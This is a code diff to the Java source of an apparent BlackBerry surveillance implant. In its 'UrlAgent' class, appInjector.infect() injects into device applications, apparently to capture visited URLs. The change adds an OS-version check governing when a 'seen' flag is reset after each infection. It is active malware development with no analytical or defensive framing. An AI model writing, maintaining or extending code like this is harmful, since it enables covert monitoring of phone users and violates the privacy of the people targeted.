@@ -15,6 +15,7 @@ import java.util.Vector;
 import net.rim.device.api.system.Backlight;
 import blackberry.AgentManager;
 import blackberry.AppListener;
+import blackberry.Device;
 import blackberry.config.Conf;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
@@ -39,7 +40,7 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
 
     AppInjector appInjector;
 
-    private boolean seen;
+    private boolean seen = true;
     //Timer applicationTimer;
     private static final long APP_TIMER_PERIOD = 5000;
 
@@ -55,6 +56,10 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
         //#ifdef URL_FORCED
         enable(true);
         //#endif
+
+        if (Device.getInstance().atLeast(6, 0)) {
+            seen = false;
+        }
     }
 
     /**
@@ -96,7 +101,9 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
             //#endif
 
             appInjector.infect();
-            seen = false;
+            if (Device.getInstance().atLeast(6, 0)) {
+                seen = false;
+            }
         }
 
     }
@@ -170,7 +177,10 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
             //#endif
 
             appInjector.infect();
-            seen = false;
+            
+            if (Device.getInstance().atLeast(6, 0)) {
+                seen = false;
+            }
         }
     }
 
